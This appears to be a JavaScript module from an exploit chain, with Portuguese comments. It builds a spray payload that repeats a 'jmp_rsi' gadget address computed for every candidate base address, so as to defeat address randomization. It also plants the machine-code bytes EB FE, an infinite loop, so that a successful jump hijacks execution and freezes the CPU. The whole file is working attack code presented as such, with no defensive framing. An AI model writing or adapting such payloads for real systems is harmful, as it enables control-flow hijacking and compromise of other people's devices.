
import { CONFIG, GADGETS } from './config.mjs';

export function build_universal_payload(size) {
    const buffer = new Uint32Array(size / 4);
    const view = new DataView(buffer.buffer);

    // ESTRATÉGIA "RAINBOW":
    // Preenchemos o objeto repetindo os endereços de pulo para TODAS as bases.
    
    let offset = 0;
    // Enquanto houver espaço no buffer
    while (offset < size) {
        // Para cada base possível
        for (let i = 0; i < CONFIG.TARGET_BASES.length; i++) {
            let base = CONFIG.TARGET_BASES[i];

            if (offset + 8 > size) break;

            // Calcula: Base + Gadget de Pulo
            let gadget_addr = base + GADGETS.jmp_rsi;
            
            // Escreve endereço de 64 bits
            view.setBigUint64(offset, gadget_addr, true); // Little Endian
            offset += 8;
        }
    }
    
    // LOOP INFINITO (EB FE) NO FINAL
    // Se o pulo funcionar, ele executa o que está em RSI (o próprio objeto).
    // Colocamos o loop no final para travar a CPU.
    const code_pos = size - 16;
    if (code_pos > 0) {
        view.setUint8(code_pos, 0xEB);
        view.setUint8(code_pos+1, 0xFE);
    }

    return buffer;
}
